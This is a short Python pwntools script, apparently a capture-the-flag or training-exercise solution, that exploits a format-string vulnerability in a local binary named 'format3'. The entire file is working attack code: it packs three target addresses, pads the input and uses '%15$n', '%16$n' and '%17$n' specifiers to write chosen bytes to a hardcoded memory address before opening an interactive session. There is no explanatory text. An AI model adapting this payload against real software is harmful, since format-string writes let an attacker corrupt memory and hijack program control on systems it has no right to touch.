from pwn import *

context.clear(arch='i386')

offset_ret = 15
target_addr = 0x5655700c
padding_1 = 56
padding_2 = 73 - padding_1
padding_3 = 245 - padding_1 - padding_2

exploit_str = p32(target_addr) + p32(target_addr+1) + p32(target_addr+2) + 'a'*padding_1 + '%15$n' + 'a'*padding_2 + '%16$n' + 'a'*padding_3 + ' %17$n'

p = process('./format3')
p.sendline(exploit_str)
p.interactive()
p.corefile
